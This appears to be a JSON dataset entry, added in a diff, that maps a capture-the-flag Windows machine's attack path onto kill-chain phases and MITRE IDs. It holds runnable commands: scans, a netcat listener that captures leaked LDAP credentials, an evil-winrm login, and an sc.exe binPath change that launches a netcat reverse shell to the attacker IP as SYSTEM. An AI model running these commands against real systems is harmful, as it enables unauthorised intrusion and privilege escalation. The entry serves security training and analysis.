@@ -1,0 +1,157 @@
+{
+  "id": "ap-0005",
+  "title": "Privilege Escalation via Service Configuration Manipulation (Return)",
+  "summary": "Obtaining user credentials through an administrative panel misconfiguration, followed by manipulating a Windows service configuration to gain system privileges.",
+  "attack_path_markdown": "### Step 1: Enumeration and Initial Access\nThe attacker performs external reconnaissance (port scan, OS detection) to identify exposed services on the Windows target machine. The web server (IIS) on port 80 exposes an 'Admin Panel' (Printer Admin Panel) which allows modification of server connection settings, typically for LDAP/Kerberos connectivity. By setting the server address to the attacker's IP, the target machine attempts an authentication connection, leaking the credentials in plain text.\n\n### Step 2: Gaining User Shell\nUsing the leaked credentials, the attacker authenticates to the WinRM service (port 5985) to gain a restricted command-line shell as the domain user `svc_printer`.\n\n### Step 3: Privilege Escalation\nThe user `svc_printer` is part of the `Server Operators` group, which grants the ability to manage certain system services (stop, start, configure). The attacker uploads a Netcat binary and uses the Windows `sc.exe` utility to modify the binary path of a malleable service (`VmTools`). Stopping and restarting the service executes the Netcat binary, delivering a highly privileged reverse shell (`nt authority\\system`) to the attacker's second listener.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target's operating system, open ports, running services, and the configuration of the web application.",
+      "actions": [
+        "Determine OS based on TTL",
+        "Full TCP port scan",
+        "Service version enumeration",
+        "Web application analysis"
+      ],
+      "tools": ["ping", "nmap", "whatweb"],
+      "techniques": ["OS Fingerprinting", "Active Scanning", "Web Server Enumeration"],
+      "mitre_ids": ["T1595.002", "T1046", "T1592.001"],
+      "indicators": ["TTL 127/128 (Windows)", "Ports 80, 5985, 389, 445 open", "IIS Web Server"],
+      "preconditions": "Target IP address (10.10.11.108)",
+      "expected_outcome": "List of open ports, Windows OS confirmed, Web Admin Panel identified.",
+      "confidence": 1.0,
+      "commands": [
+        "ping -c 1 10.10.11.108",
+        "nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.108",
+        "nmap -sC -sV -p[OPEN_PORTS] 10.10.11.108",
+        "whatweb 10.10.11.108"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of the exploitation components, primarily the Netcat listener.",
+      "actions": [
+        "Set up initial listener to capture credentials"
+      ],
+      "tools": ["Netcat (nc)"],
+      "techniques": ["Listener Deployment"],
+      "mitre_ids": ["T1049"],
+      "indicators": ["Attacker listener active"],
+      "preconditions": "Reconnaissance complete, target web application functionality understood.",
+      "expected_outcome": "Listener awaiting connection on port 389.",
+      "confidence": 1.0,
+      "commands": [
+        "nc -lnvp 389"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Sending the vector (attacker's IP) to the vulnerable application configuration.",
+      "actions": [
+        "Modify the internal server address in the web application settings."
+      ],
+      "tools": ["Web Browser"],
+      "techniques": ["Input Manipulation"],
+      "mitre_ids": ["T1190"],
+      "indicators": ["Target machine attempts to connect back to attacker's IP on port 389."],
+      "preconditions": "Access to the web admin panel.",
+      "expected_outcome": "Connection received by the attacker's listener.",
+      "confidence": 1.0,
+      "commands": [
+        "Set 'Server Address' to 10.10.14.29 (attacker IP)",
+        "Set 'Port' to 389"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Capturing the authentication attempt and obtaining leaked credentials.",
+      "actions": [
+        "Receive inbound connection",
+        "Extract username and password"
+      ],
+      "tools": ["Netcat (nc)"],
+      "techniques": ["Information Leakage", "Network Sniffing (Implied)"],
+      "mitre_ids": ["T1552"],
+      "indicators": ["Credentials captured: svc_printer:PASSWORD"],
+      "preconditions": "Successful connection from the target machine.",
+      "expected_outcome": "Valid credentials for the domain user 'svc_printer' obtained.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing initial persistent remote access via WinRM using valid credentials.",
+      "actions": [
+        "Authenticate to WinRM service"
+      ],
+      "tools": ["Evil-WinRM"],
+      "techniques": ["Remote Services Access", "Use of Other Protocols"],
+      "mitre_ids": ["T1021.006"],
+      "indicators": ["Interactive Windows shell (C:\\Users\\svc_printer\\Desktop)"],
+      "preconditions": "Valid credentials (`svc_printer:PASSWORD`) and WinRM port 5985 open.",
+      "expected_outcome": "Low-privileged shell on the target machine.",
+      "confidence": 1.0,
+      "commands": [
+        "evil-winrm -i 10.10.11.108 -u svc_printer -p 'PASSWORD'"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Maintaining communication channels for user and privileged access.",
+      "actions": [
+        "Check user privileges and group memberships",
+        "Prepare files for privilege escalation"
+      ],
+      "tools": ["Evil-WinRM", "sc.exe", "Netcat (nc)"],
+      "techniques": ["Permission Group Discovery", "File Transfer"],
+      "mitre_ids": ["T1069.001", "T1105"],
+      "indicators": ["User belongs to 'Server Operators' group", "Netcat executable uploaded."],
+      "preconditions": "Successful user shell.",
+      "expected_outcome": "Identification of privilege escalation vector (Service Configuration Manipulation).",
+      "confidence": 1.0,
+      "commands": [
+        "whoami /groups",
+        "upload netcat.exe"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Escalating privileges by abusing service configuration manipulation rights granted by the 'Server Operators' group.",
+      "actions": [
+        "Configure second listener for system shell",
+        "Modify service binary path using Server Operator rights",
+        "Stop and start the manipulated service",
+        "Capture privileged reverse shell"
+      ],
+      "tools": ["Netcat (nc)", "sc.exe"],
+      "techniques": ["Windows Service Modification", "Reverse Shell"],
+      "mitre_ids": ["T1543.003", "T1053.005"],
+      "indicators": ["Shell prompt changes to NT AUTHORITY\\SYSTEM"],
+      "preconditions": "User in 'Server Operators' group, Netcat uploaded, second listener active.",
+      "expected_outcome": "Administrator/System privileges obtained and root flag retrieved.",
+      "confidence": 1.0,
+      "commands": [
+        "nc -lnvp 443",
+        "sc.exe config VmTools binPath=\"C:\\Users\\svc_printer\\Desktop\\netcat.exe 10.10.14.29 443 -e cmd.exe\"",
+        "sc.exe stop VmTools",
+        "sc.exe start VmTools"
+      ]
+    }
+  ],
+  "tactics": ["Initial Access", "Credential Access", "Lateral Movement", "Privilege Escalation"],
+  "techniques": ["Information Leakage", "Service Configuration Manipulation", "WinRM Access"],
+  "mitre_ids": ["T1190", "T1021.006", "T1543.003", "T1069.001"],
+  "hosts": ["target_machine.return.local", "attacker_host"],
+  "privs_obtained": ["domain user", "nt authority\\system"],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "Machine involves exploiting a web configuration flaw to leak credentials and then leveraging specific Windows group permissions (Server Operators) for privilege escalation by modifying the binPath of the VmTools service.",
+  "labels": ["attack_path", "windows", "privilege_escalation", "service_abuse"]
+}
+
